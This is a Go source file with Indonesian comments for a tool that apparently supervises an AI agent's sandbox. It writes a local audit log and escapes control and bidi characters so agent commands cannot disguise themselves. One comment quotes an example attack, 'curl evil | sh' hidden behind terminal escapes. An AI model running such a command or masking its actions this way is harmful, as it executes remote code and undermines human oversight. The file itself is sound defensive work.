package claudehand

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode/utf8"
)

const (
	// auditRotate — berkas audit dipindah ke <nama>.1 bila sudah sebesar ini.
	auditRotate = 10 << 20
	// auditCmdMax — perintah Bash dicatat paling panjang sekian karakter.
	auditCmdMax = 4000
)

// Audit — log audit lokal (0600): aksi + path/perintah, TIDAK PERNAH isi
// berkas atau keluaran perintah. Satu baris per peristiwa, diawali waktu
// lokal laptop dan id jalan (beberapa jalan bisa menulis berkas yang sama).
type Audit struct {
	Path string
	mu   sync.Mutex
	f    *os.File
	run  string
	now  func() time.Time
}

// OpenAudit — buka (atau buat) berkas audit untuk ditambahi.
func OpenAudit(path string, now func() time.Time) (*Audit, error) {
	if now == nil {
		now = time.Now
	}
	if fi, err := os.Stat(path); err == nil && fi.Size() >= auditRotate {
		_ = os.Rename(path, path+".1")
	}
	f, err := os.OpenFile(path, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0o600)
	if err != nil {
		return nil, fmt.Errorf("log audit %s: %w", path, err)
	}
	if runtime.GOOS != "windows" {
		if fi, err := f.Stat(); err == nil && fi.Mode().Perm()&0o077 != 0 {
			_ = f.Chmod(0o600)
		}
	}
	var id [3]byte
	_, _ = rand.Read(id[:])
	return &Audit{Path: path, f: f, run: hex.EncodeToString(id[:]), now: now}, nil
}

// Log — satu peristiwa. event dan detail (bisa berasal dari box) dinetralkan
// dengan Printable: satu baris, tanpa karakter kontrol mentah.
func (a *Audit) Log(event, detail string) {
	if a == nil {
		return
	}
	line := a.now().Format("2006-01-02T15:04:05-07:00") + " [" + a.run + "] " + Printable(event)
	if detail != "" {
		line += " " + Printable(detail)
	}
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.f != nil {
		_, _ = a.f.WriteString(line + "\n")
	}
}

// Close — tutup berkas.
func (a *Audit) Close() error {
	if a == nil {
		return nil
	}
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.f == nil {
		return nil
	}
	err := a.f.Close()
	a.f = nil
	return err
}

// QuoteCommand — perintah Bash untuk audit: dikutip (baris baru terlihat
// sebagai \n, tidak bisa memalsukan baris audit lain), dipotong bila panjang.
func QuoteCommand(cmd string) string {
	if r := []rune(cmd); len(r) > auditCmdMax {
		cmd = string(r[:auditCmdMax]) + "…"
	}
	return strconv.Quote(cmd)
}

// Printable — teks (terutama asal box: perintah Bash, path, nama tool) yang
// aman dicetak ke terminal atau ditulis ke log audit: karakter kontrol C0
// (termasuk \n \r \t), DEL, C1, pemisah baris/paragraf Unicode, dan penanda
// arah teks (bidi) diganti escape yang TERLIHAT (`\x1b`, `\n`, `\u009b`,
// `\u202e`). Tanpa ini box bisa menyamarkan aksinya, mis. perintah
// "curl evil | sh\x1b[1G\x1b[2K$ ls" tampil sebagai "$ ls". Teks Unicode
// biasa (huruf non-Latin, emoji) tidak diubah; byte UTF-8 rusak → U+FFFD.
func Printable(s string) string { return printable(s, false) }

// PrintableLines — seperti Printable, tetapi "\n" dibiarkan (pesan lokal
// bertingkat); karakter kontrol lain tetap di-escape.
func PrintableLines(s string) string { return printable(s, true) }

func printable(s string, keepNL bool) string {
	clean := utf8.ValidString(s)
	for _, r := range s {
		if clean && hiddenRune(r) && !(keepNL && r == '\n') {
			clean = false
		}
	}
	if clean {
		return s
	}
	var b strings.Builder
	b.Grow(len(s) + 16)
	for _, r := range s { // byte rusak → utf8.RuneError (U+FFFD)
		switch {
		case keepNL && r == '\n':
			b.WriteRune(r)
		case r == '\n':
			b.WriteString(`\n`)
		case r == '\r':
			b.WriteString(`\r`)
		case r == '\t':
			b.WriteString(`\t`)
		case hiddenRune(r) && r < utf8.RuneSelf:
			fmt.Fprintf(&b, `\x%02x`, r)
		case hiddenRune(r):
			fmt.Fprintf(&b, `\u%04x`, r)
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}

// hiddenRune — karakter yang mengendalikan terminal atau mengubah urutan
// tampilan teks, bukan menampilkan huruf.
func hiddenRune(r rune) bool {
	switch {
	case r < 0x20, r == 0x7f, r >= 0x80 && r <= 0x9f: // C0, DEL, C1
		return true
	case r == 0x2028, r == 0x2029: // pemisah baris/paragraf
		return true
	case r == 0x061c, r == 0x200e, r == 0x200f, r >= 0x202a && r <= 0x202e, r >= 0x2066 && r <= 0x2069: // bidi
		return true
	}
	return false
}

// Short — ringkas untuk terminal: spasi dirapatkan, dipotong n karakter
// (seperti short() di P1).
func Short(s string, n int) string {
	s = strings.Join(strings.Fields(s), " ")
	if r := []rune(s); len(r) > n {
		return string(r[:n-1]) + "…"
	}
	return s
}
